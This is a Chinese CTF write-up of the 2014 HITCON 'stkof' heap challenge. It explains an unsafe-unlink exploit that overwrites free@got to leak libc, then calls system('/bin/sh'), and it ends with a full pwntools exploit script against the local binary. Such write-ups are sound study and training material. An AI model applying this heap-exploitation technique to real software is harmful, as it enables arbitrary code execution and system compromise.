---
title: 2014 HITCON stkof
date: 2018-10-17 23:25:59
tags: [unlink]
---

### 基本信息
```
stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped
```
```
Canary                        : Yes
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```
和shellman不同的是，程序中不提供输出的函数，所以需要通过unlink漏洞实现任意地址读写，修改free@got为puts@plt。

### 程序基本功能
程序存在 4 个功能，经过 IDA 分析后可以分析功能如下

- alloc：输入 size，malloc(size)，并在 bss 段(0x602148)记录对应 chunk 的指针
- read_in：输入索引，向分配的内存处写入数据，数据长度可控，这里存在堆溢出的情况
- free：输入索引，free已经分配的内存块
- useless：无用

### 基本思路
根据unsafe unlink原理，malloc三个chunk（第一个0x100的chunk是为什么解决IO缓冲区的问题）。
1. 向第一个chunk写入伪造的数据，并溢出第二个chunk。
```
        payload = p64(0)                  #chunk2
        payload += p64(0x30)
        payload += p64(ptr+0x10-0x18)
        payload += p64(ptr+0x10-0x10)
        payload = payload.ljust(0x30,'a')

        payload += p64(0x30)              #chunk3
        payload += p64(0x90)
        edit(2,payload)
        free(3)   # 0x602150 -> 0x602138

```
  free(3)之后，获得了一个可控的指针0x602150 -> 0x602138

2. 0x602150存储的是malloc(chunk2)返回的指针，所以当向chunk2中写数据时，数据会被写到0x602138处。通过这个指向自己`-0x18`地址的指针，可以修改chunk1返回指针的内容为free的got地址，修改chunk2返回指针的内容为puts的地址。
```
        payload = 'a'*16 + p64(stkof.got['free']) + p64(stkof.got['puts'])
        edit(2,payload)

```
  此时chunk1的指针指向了free@got的地址，那么向其中写入puts@plt的地址的话，程序调用free函数时就会调用puts函数。此时chunk2的指针指向了puts@got的地址，再free(2)的话其实执行的puts(2)，就会打印chunk2返回指针指向的内容，即puts(puts@got)，从而获得了puts的地址。
```
        payload = p64(stkof.plt['puts'])
        edit(1,payload)
        free(2)
        puts_addr = p.recvuntil('\nOK\n',drop=True).ljust(8,'\00')
        puts_addr = u64(puts_addr)

```
3. 接着泄露并计算出system的地址，再次修改chunk1返回指针的内容为system的got地址，free(chunk3)中的内容就可以获得shell

### EXP
```
#!/usr/bin/env python
from pwn import *

p = process('./stkof')
stkof = ELF('./stkof')
libc = ELF('./libc.so.6')

DEBUG = 0
VERBOSE = 1
if DEBUG:
	gdb.attach(p)
if VERBOSE:
	context(log_level = 'debug')

def alloc(size):
	p.sendline('1')
	p.sendline(str(size))
	p.recvuntil('OK\n')

def edit(idx,content):
	p.sendline('2')
	p.sendline(str(idx))
	p.sendline(str(len(content)))
	p.send(content)
	p.recvuntil('OK\n')

def free(idx):
	p.sendline('3')
	p.sendline(str(idx))

ptr = 0x602140

def exp():
	alloc(0x100)
	alloc(0x30)
	alloc(0x80)
	alloc(0x80)
	edit(4,'/bin/sh;'+'c'*(0x80-len('/bin/sh;')))
	payload = p64(0)
	payload += p64(0x30)
	payload += p64(ptr+0x10-0x18)
	payload += p64(ptr+0x10-0x10)
	payload = payload.ljust(0x30,'a')

	payload += p64(0x30)
	payload += p64(0x90)

	edit(2,payload)
	free(3)   # 0x602150 -> 0x602138
	gdb.attach(p)
	raw_input()
	p.recvuntil('OK\n')

	payload = 'a'*16 + p64(stkof.got['free']) + p64(stkof.got['puts'])
	edit(2,payload)
	payload = p64(stkof.plt['puts'])
	edit(1,payload)

	free(2)
	puts_addr = p.recvuntil('\nOK\n',drop=True).ljust(8,'\00')
	puts_addr = u64(puts_addr)
	log.success('puts_addr:' + hex(puts_addr))

	libc_base = puts_addr - libc.symbols['puts']
	system_addr = libc_base + libc.symbols['system']
	binsh_addr = libc_base + next(libc.search('/bin/sh'))
	log.success('system_addr:'+ hex(system_addr))
	log.success('binsh_addr:'+hex(binsh_addr))

	payload = p64(system_addr)
	edit(1,payload)
	free(4)
	p.interactive()

exp()

```
